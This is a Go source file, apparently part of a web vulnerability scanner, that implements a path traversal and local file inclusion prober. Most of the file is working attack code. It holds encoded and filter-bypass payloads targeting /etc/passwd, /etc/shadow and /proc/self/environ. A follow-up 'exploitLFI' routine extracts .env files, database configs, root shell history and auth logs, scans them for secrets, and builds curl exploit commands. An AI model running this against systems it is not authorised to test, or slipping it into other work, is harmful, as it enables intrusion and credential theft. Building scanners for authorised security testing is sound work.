package probers

import (
	"context"
	"fmt"
	"net/url"
	"strings"

	"github.com/borntobeyours/ouroboros/pkg/types"
)

// PathTraversalProber tests for path traversal / local file inclusion.
type PathTraversalProber struct{}

func (p *PathTraversalProber) Name() string { return "pathtraversal" }

func (p *PathTraversalProber) Probe(ctx context.Context, target types.Target, endpoints []types.Endpoint) []types.Finding {
	cfg := NewProberConfig(target)
	if currentClassified != nil {
		cfg.Classified = currentClassified
	}
	var findings []types.Finding

	findings = append(findings, p.testLFI(cfg, endpoints)...)
	findings = append(findings, p.testCommonLFIPaths(cfg)...)

	return findings
}

// testLFI tests endpoints with file/path-like parameters for LFI.
func (p *PathTraversalProber) testLFI(cfg *ProberConfig, endpoints []types.Endpoint) []types.Finding {
	var findings []types.Finding

	// Parameters that commonly accept file paths
	fileParams := []string{"file", "path", "page", "include", "template", "doc",
		"document", "folder", "root", "dir", "img", "image", "filename",
		"name", "lang", "language", "module", "view", "layout", "theme",
		"style", "stylesheet", "log", "config", "conf", "data", "content",
		"cat", "category", "action", "type", "read", "load", "download",
		"src", "source", "resource", "rsc"}

	// Traversal payloads — escalating from basic to bypass
	payloads := []struct {
		path   string
		desc   string
		bypass string
	}{
		{"../../../etc/passwd", "basic traversal", ""},
		{"....//....//....//etc/passwd", "double-dot bypass", "filter bypass"},
		{"..%2f..%2f..%2fetc%2fpasswd", "URL-encoded traversal", "encoding bypass"},
		{"..%252f..%252f..%252fetc%252fpasswd", "double URL-encoded", "double encoding bypass"},
		{"....%5c....%5c....%5cetc%5cpasswd", "backslash encoded", "OS bypass"},
		{"/etc/passwd", "absolute path", "no traversal needed"},
		{"../../../etc/shadow", "shadow file", ""},
		{"../../../proc/self/environ", "proc environ", ""},
		{"../../../proc/self/cmdline", "proc cmdline", ""},
		{"../../../Windows/System32/drivers/etc/hosts", "Windows hosts", ""},
	}

	// Linux file signatures for validation
	type fileSignature struct {
		path       string
		indicators []string
		severity   string
		desc       string
	}

	linuxFiles := []fileSignature{
		{"/etc/passwd", []string{"root:", "/bin/bash", "/bin/sh", "nobody:", "/sbin/nologin"}, "Critical",
			"Local File Inclusion — /etc/passwd readable. System user accounts exposed."},
		{"/etc/shadow", []string{"root:", "$6$", "$5$", "$y$"}, "Critical",
			"Local File Inclusion — /etc/shadow readable. Password hashes exposed, can be cracked offline."},
		{"/proc/self/environ", []string{"PATH=", "HOME=", "USER=", "SHELL=", "LANG="}, "Critical",
			"Local File Inclusion — /proc/self/environ readable. Environment variables (potentially secrets) exposed."},
		{"/proc/self/cmdline", []string{"python", "java", "node", "ruby", "php"}, "High",
			"Local File Inclusion — /proc/self/cmdline readable. Process command line exposed."},
	}

	windowsFiles := []fileSignature{
		{"/Windows/System32/drivers/etc/hosts", []string{"localhost", "127.0.0.1"}, "High",
			"Local File Inclusion — Windows hosts file readable."},
	}

	tested := make(map[string]bool)

	for _, ep := range endpoints {
		if ep.HasCategory(types.CatStatic) {
			continue
		}

		for _, param := range ep.Parameters {
			lowerParam := strings.ToLower(param)
			isFileParam := false
			for _, fp := range fileParams {
				if lowerParam == fp {
					isFileParam = true
					break
				}
			}
			if !isFileParam {
				continue
			}

			path := extractPath(ep.URL)
			baseEndpoint := strings.Split(ep.URL, "?")[0]
			testKey := path + "|" + param
			if tested[testKey] {
				continue
			}
			tested[testKey] = true

			for _, payload := range payloads {
				fullURL := fmt.Sprintf("%s?%s=%s", baseEndpoint, param, url.QueryEscape(payload.path))
				status, _, respBody, err := cfg.DoRequest("GET", fullURL, nil, nil)
				if err != nil || status != 200 || len(respBody) < 10 {
					continue
				}

				// Skip HTML error pages
				if strings.Contains(respBody, "<!DOCTYPE") || strings.Contains(respBody, "<html") {
					lowerBody := strings.ToLower(respBody)
					if !strings.Contains(lowerBody, "root:") && !strings.Contains(lowerBody, "path=") {
						continue
					}
				}

				// Check against known file signatures
				allSigs := append(linuxFiles, windowsFiles...)
				for _, sig := range allSigs {
					if !strings.Contains(payload.path, sig.path[1:]) { // strip leading /
						continue
					}
					lowerBody := strings.ToLower(respBody)
					matched := false
					for _, indicator := range sig.indicators {
						if strings.Contains(lowerBody, strings.ToLower(indicator)) {
							matched = true
							break
						}
					}
					if !matched {
						continue
					}

					// PROVEN — we actually read the file!
					f := p.exploitLFI(cfg, baseEndpoint, param, payload.path, payload.desc, respBody, sig, payload.bypass)
					findings = append(findings, f)
					return findings // One proven LFI is critical enough
				}
			}
		}
	}

	return findings
}

// exploitLFI performs follow-up exploitation after confirming LFI.
func (p *PathTraversalProber) exploitLFI(cfg *ProberConfig, baseEndpoint, param, initialPayload, traversalType, initialResp string, sig struct {
	path       string
	indicators []string
	severity   string
	desc       string
}, bypassType string) types.Finding {

	// Phase 2: Try to read more sensitive files
	sensitiveFiles := []struct {
		path    string
		desc    string
		secrets []string
	}{
		{"../../../etc/passwd", "system users", []string{"root:"}},
		{"../../../etc/shadow", "password hashes", []string{"$6$", "$5$", "$y$"}},
		{"../../../proc/self/environ", "environment variables", []string{"PATH=", "SECRET", "KEY", "TOKEN", "PASSWORD"}},
		{"../../../proc/self/cmdline", "process command", []string{}},
		{"../../../etc/hostname", "hostname", []string{}},
		{"../../../etc/hosts", "hosts file", []string{"localhost"}},
		{"../../../etc/nginx/nginx.conf", "nginx config", []string{"server", "location"}},
		{"../../../etc/apache2/apache2.conf", "apache config", []string{"ServerRoot", "DocumentRoot"}},
		{"../../../var/log/auth.log", "auth logs", []string{"session", "sshd"}},
		{"../../../root/.bash_history", "root history", []string{}},
		{"../../../home", "home directory listing", []string{}},
		{"../../../app/.env", "app environment", []string{"DB_", "API_", "SECRET"}},
		{"../../../app/config/database.yml", "database config", []string{"adapter", "database", "password"}},
		{"../.env", "local .env", []string{"DB_", "API_", "SECRET", "KEY"}},
	}

	var exfiltrated []string
	var extractedSecrets []string

	for _, sf := range sensitiveFiles {
		fullURL := fmt.Sprintf("%s?%s=%s", baseEndpoint, param, url.QueryEscape(sf.path))
		status, _, respBody, err := cfg.DoRequest("GET", fullURL, nil, nil)
		if err != nil || status != 200 || len(respBody) < 5 {
			continue
		}

		// Validate it's actual file content, not error page
		if strings.Contains(respBody, "<!DOCTYPE") && !strings.Contains(strings.ToLower(respBody), "root:") {
			continue
		}

		exfiltrated = append(exfiltrated, fmt.Sprintf("=== %s ===\n%s", sf.path, truncate(respBody, 500)))

		// Check for secrets in the response
		for _, secret := range sf.secrets {
			if strings.Contains(strings.ToLower(respBody), strings.ToLower(secret)) {
				extractedSecrets = append(extractedSecrets, fmt.Sprintf("%s contains '%s'", sf.path, secret))
			}
		}
	}

	// Build the finding
	title := fmt.Sprintf("Path Traversal → Local File Read — %s via %s", sig.path, param)
	if len(exfiltrated) > 3 {
		title = fmt.Sprintf("Path Traversal → %d Files Extracted via %s parameter", len(exfiltrated), param)
	}

	severity := sig.severity
	desc := sig.desc
	if len(exfiltrated) > 3 {
		severity = "Critical"
		desc += fmt.Sprintf(" Follow-up exploitation extracted %d additional files.", len(exfiltrated))
	}
	if len(extractedSecrets) > 0 {
		desc += fmt.Sprintf(" Secrets found: %s.", strings.Join(extractedSecrets, "; "))
	}

	evidence := fmt.Sprintf("Initial read (%s):\n%s\n\nTraversal type: %s",
		initialPayload, truncate(initialResp, 300), traversalType)
	if bypassType != "" {
		evidence += fmt.Sprintf("\nBypass: %s", bypassType)
	}
	evidence += fmt.Sprintf("\nTotal files extracted: %d", len(exfiltrated))

	poc := fmt.Sprintf("# Path traversal exploit:\ncurl \"%s?%s=%s\"\n",
		baseEndpoint, param, url.QueryEscape(initialPayload))
	poc += fmt.Sprintf("\n# Extract more files:\n")
	for _, sf := range sensitiveFiles[:5] {
		poc += fmt.Sprintf("curl \"%s?%s=%s\"\n", baseEndpoint, param, url.QueryEscape(sf.path))
	}

	f := MakeFinding(title, severity, desc, extractPath(baseEndpoint), "GET", "CWE-22", poc, evidence, "path_traversal", 0)
	if len(exfiltrated) > 0 {
		f.ExfiltratedData = strings.Join(exfiltrated, "\n\n")
	}
	return f
}

// testCommonLFIPaths tests common LFI-vulnerable URL patterns (no parameter needed).
func (p *PathTraversalProber) testCommonLFIPaths(cfg *ProberConfig) []types.Finding {
	var findings []types.Finding

	// Common vulnerable URL patterns
	patterns := []struct {
		path     string
		payloads []string
	}{
		{"/download/", []string{"../../../etc/passwd", "....//....//etc/passwd"}},
		{"/read/", []string{"../../../etc/passwd"}},
		{"/file/", []string{"../../../etc/passwd"}},
		{"/view/", []string{"../../../etc/passwd"}},
		{"/include/", []string{"../../../etc/passwd"}},
		{"/static/", []string{"../../../etc/passwd"}},
		{"/assets/", []string{"../../../etc/passwd"}},
		{"/uploads/", []string{"../../../etc/passwd"}},
		{"/images/", []string{"../../../etc/passwd"}},
	}

	for _, pat := range patterns {
		for _, payload := range pat.payloads {
			testURL := cfg.BaseURL + pat.path + payload
			status, _, respBody, err := cfg.DoRequest("GET", testURL, nil, nil)
			if err != nil || status != 200 || len(respBody) < 10 {
				continue
			}

			lowerBody := strings.ToLower(respBody)
			if strings.Contains(lowerBody, "root:") && (strings.Contains(lowerBody, "/bin/bash") || strings.Contains(lowerBody, "/bin/sh") || strings.Contains(lowerBody, "nobody:")) {
				poc := fmt.Sprintf("curl \"%s\"", testURL)

				findings = append(findings, MakeFinding(
					fmt.Sprintf("Path Traversal via URL Path — %s", pat.path),
					"Critical",
					fmt.Sprintf("Direct path traversal in URL path %s allows reading system files. /etc/passwd content extracted.", pat.path),
					pat.path+payload,
					"GET",
					"CWE-22",
					poc,
					fmt.Sprintf("HTTP %d - /etc/passwd content:\n%s", status, truncate(respBody, 500)),
					"path_traversal",
					0,
				))
				findings[len(findings)-1].ExfiltratedData = truncate(respBody, 2000)
				return findings
			}
		}
	}

	return findings
}
